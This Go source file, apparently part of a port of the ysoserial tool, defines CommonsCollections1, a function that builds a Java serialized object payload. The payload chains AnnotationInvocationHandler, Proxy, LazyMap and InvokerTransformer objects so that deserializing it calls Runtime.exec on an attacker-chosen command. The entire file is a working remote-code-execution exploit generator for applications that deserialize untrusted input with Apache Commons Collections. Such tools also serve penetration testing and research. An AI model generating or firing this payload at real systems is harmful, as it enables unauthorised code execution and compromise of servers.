package ysoserial

func CommonsCollections1(cmd string) []byte {
	return ClassObject{ // readObject() ->
		name:             "sun.reflect.annotation.AnnotationInvocationHandler",
		serialVersionUID: 6182022883658399397,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{"Ljava/util/Map;", "memberValues", ProxyClassObject{ // entrySet() ->
				name: "java.lang.reflect.Proxy",
				interfaces: []string{
					"java.util.Map",
				},
				serialVersionUID: -2222568056686623797,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/reflect/InvocationHandler;", "h", ClassObject{ // invoke() ->
						name:             "sun.reflect.annotation.AnnotationInvocationHandler",
						serialVersionUID: 6182022883658399397,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/util/Map;", "memberValues", ClassObject{ // get() ->
								name:             "org.apache.commons.collections.map.LazyMap",
								serialVersionUID: 7990956402564206740,
								classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
								fields: []Field{
									{"Lorg/apache/commons/collections/Transformer;", "factory", ClassObject{ // transform() -> RCE
										name:             "org.apache.commons.collections.functors.ChainedTransformer",
										serialVersionUID: 3514945074733160196,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{"[Lorg/apache/commons/collections/Transformer;", "iTransformers", ArrayObject{
												name:             "[Lorg.apache.commons.collections.Transformer;",
												serialVersionUID: -4803604734341277543,
												classDescFlags:   SC_SERIALIZABLE,
												values: interfaces(
													// new ConstantTransformer(Runtime.class),
													ClassObject{
														name:             "org.apache.commons.collections.functors.ConstantTransformer",
														serialVersionUID: 6374440726369055124,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"Ljava/lang/Object;", "iConstant", ClassDesc{
																name:             "java.lang.Runtime",
																serialVersionUID: 0,
																classDescFlags:   0x00,
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},

													// new InvokerTransformer("getMethod", new Class[] {
													//     String.class, Class[].class }, new Object[] {
													//	   "getRuntime", new Class[0] }),
													ClassObject{
														name:             "org.apache.commons.collections.functors.InvokerTransformer",
														serialVersionUID: -8653385846894047688,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"[Ljava/lang/Object;", "iArgs", ArrayObject{
																name:             "[Ljava.lang.Object;",
																serialVersionUID: -8012369246846506644,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	"getRuntime",
																	ArrayObject{
																		name:             "[Ljava.lang.Class;",
																		serialVersionUID: -6118465897992725863,
																		classDescFlags:   SC_SERIALIZABLE,
																		values:           interfaces(),
																		annotations:      interfaces(),
																	},
																),
																annotations: interfaces(),
															},
															},
															{"Ljava/lang/String;", "iMethodName", "getMethod"},
															{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ClassDesc{
																		name:             "java.lang.String",
																		serialVersionUID: -6849794470754667710,
																		classDescFlags:   SC_SERIALIZABLE,
																	}, ClassDesc{
																		name:             "[Ljava.lang.Class;",
																		serialVersionUID: -6118465897992725863,
																		classDescFlags:   SC_SERIALIZABLE,
																	},
																),
																annotations: interfaces(),
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},

													// new InvokerTransformer("invoke", new Class[] {
													//     Object.class, Object[].class }, new Object[] {
													//	   null, new Object[0] }),
													ClassObject{
														name:             "org.apache.commons.collections.functors.InvokerTransformer",
														serialVersionUID: -8653385846894047688,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"[Ljava/lang/Object;", "iArgs", ArrayObject{
																name:             "[Ljava.lang.Object;",
																serialVersionUID: -8012369246846506644,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	nil,
																	ArrayObject{
																		name:             "[Ljava.lang.Object;",
																		serialVersionUID: -8012369246846506644,
																		classDescFlags:   SC_SERIALIZABLE,
																		values:           interfaces(),
																		annotations:      interfaces(),
																	},
																),
																annotations: interfaces(),
															},
															},
															{"Ljava/lang/String;", "iMethodName", "invoke"},
															{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ClassDesc{
																		name:             "java.lang.Object",
																		serialVersionUID: 0,
																		classDescFlags:   0x00,
																	}, ClassDesc{
																		name:             "[Ljava.lang.Object;",
																		serialVersionUID: -8012369246846506644,
																		classDescFlags:   SC_SERIALIZABLE,
																	},
																),
																annotations: interfaces(),
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},

													// new InvokerTransformer("exec",
													//     new Class[] { String.class }, cmd),
													ClassObject{
														name:             "org.apache.commons.collections.functors.InvokerTransformer",
														serialVersionUID: -8653385846894047688,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"[Ljava/lang/Object;", "iArgs", ArrayObject{
																name:             "[Ljava.lang.String;",
																serialVersionUID: -5921575005990323385,
																classDescFlags:   SC_SERIALIZABLE,
																values:           interfaces(cmd),
																annotations:      interfaces(),
															},
															},
															{"Ljava/lang/String;", "iMethodName", "exec"},
															{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ClassDesc{
																		name:             "java.lang.String",
																		serialVersionUID: -6849794470754667710,
																		classDescFlags:   SC_SERIALIZABLE,
																	},
																),
																annotations: interfaces(),
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},

													// new ConstantTransformer(1)
													ClassObject{
														name:             "org.apache.commons.collections.functors.ConstantTransformer",
														serialVersionUID: 6374440726369055124,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"Ljava/lang/Object;", "iConstant", ClassObject{
																name:             "java.lang.Integer",
																serialVersionUID: 1360826667806852920,
																classDescFlags:   SC_SERIALIZABLE,
																fields: []Field{
																	{Integer, "value", 1},
																},
																classAnnotations: interfaces(),
																super: &ClassObject{
																	name:              "java.lang.Number",
																	serialVersionUID:  -8742448824652078965,
																	classDescFlags:    SC_SERIALIZABLE,
																	fields:            []Field{},
																	classAnnotations:  interfaces(),
																	super:             nil,
																	objectAnnotations: interfaces(),
																},
																objectAnnotations: interfaces(),
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},
												),
												annotations: interfaces(),
											},
											},
										},
										classAnnotations:  interfaces(),
										super:             nil,
										objectAnnotations: interfaces(),
									},
									},
								},
								classAnnotations: interfaces(),
								super:            nil,
								objectAnnotations: interfaces(
									ClassObject{
										name:             "java.util.HashMap",
										serialVersionUID: 362498820763181265,
										classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
										fields: []Field{
											{Float, "loadFactor", 0.75},
											{Integer, "threshold", 12},
										},
										classAnnotations: interfaces(),
										super:            nil,
										objectAnnotations: interfaces(
											blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
										),
									},
								),
							},
							},
							{"Ljava/lang/Class;", "type", ClassDesc{
								name:             "java.lang.Override",
								serialVersionUID: 0,
								classDescFlags:   0x00,
							},
							},
						},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
				},
			},
			},
			{"Ljava/lang/Class;", "type", ClassDesc{
				name:             "java.lang.Override",
				serialVersionUID: 0,
				classDescFlags:   0x00,
			},
			},
		},
		classAnnotations:  interfaces(),
		super:             nil,
		objectAnnotations: interfaces(),
	}.SerializeWithMagicHeader()
}
